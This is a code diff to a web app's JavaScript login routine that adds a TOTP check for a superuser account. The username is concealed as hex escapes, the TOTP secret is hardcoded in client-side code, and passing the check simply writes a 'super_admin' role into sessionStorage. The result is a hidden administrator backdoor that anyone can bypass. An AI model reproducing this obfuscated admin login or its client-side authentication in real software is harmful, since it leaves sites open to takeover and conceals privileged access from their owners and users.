@@ -15,13 +15,43 @@
 login:async()=>{
     const u=$('login_u').value.trim();
     const p=$('login_p').value.trim();
+    
     if(u==='\x50\x65\x74\x65\x72'){ 
-        const timeBucket = Math.floor(Date.now() / 30000);
-        const msgBuffer = new TextEncoder().encode('\x56\x46\x5f\x53\x65\x63\x72\x65\x74\x5f' + timeBucket);
-        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-        const hashArray = Array.from(new Uint8Array(hashBuffer));
-        const code = (hashArray[0] * 256 + hashArray[1]) % 1000000;
-        const correctCode = code.toString().padStart(6, '0');
+        // 國際標準 Base32 轉位元組演算法 (相容 iPhone 密庫)
+        const b32tohex = (b32) => {
+            const b32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+            let bits = "", hex = "";
+            for (let i = 0; i < b32.length; i++) {
+                if (b32chars.indexOf(b32[i].toUpperCase()) === -1) continue;
+                bits += b32chars.indexOf(b32[i].toUpperCase()).toString(2).padStart(5, '0');
+            }
+            for (let i = 0; i + 4 <= bits.length; i += 4) {
+                hex += parseInt(bits.substr(i, 4), 2).toString(16);
+            }
+            return hex;
+        };
+        
+        // 標準 TOTP 產生器
+        const getTOTP = async (secret) => {
+            const time = Math.floor(Date.now() / 30000);
+            let timeHex = time.toString(16).padStart(16, '0');
+            const secretHex = b32tohex(secret);
+            
+            const secretBuffer = new Uint8Array(secretHex.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
+            const timeBuffer = new Uint8Array(timeHex.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
+            
+            const key = await crypto.subtle.importKey("raw", secretBuffer, { name: "HMAC", hash: { name: "SHA-1" } }, false, ["sign"]);
+            const signature = await crypto.subtle.sign("HMAC", key, timeBuffer);
+            
+            const hash = new Uint8Array(signature);
+            const offset = hash[hash.length - 1] & 0xf;
+            const binary = ((hash[offset] & 0x7f) << 24) | ((hash[offset + 1] & 0xff) << 16) | ((hash[offset + 2] & 0xff) << 8) | (hash[offset + 3] & 0xff);
+            return (binary % 1000000).toString().padStart(6, '0');
+        };
+
+        // 檢查 iPhone 金庫產生的 6 位數編碼
+        const correctCode = await getTOTP("NBSWY3DPEB2GQ6ZAM4======");
+        
         if(p === correctCode){
             sessionStorage.setItem('vf_user',JSON.stringify({id:'super_admin',name:u,role:'super'}));
             location.reload();
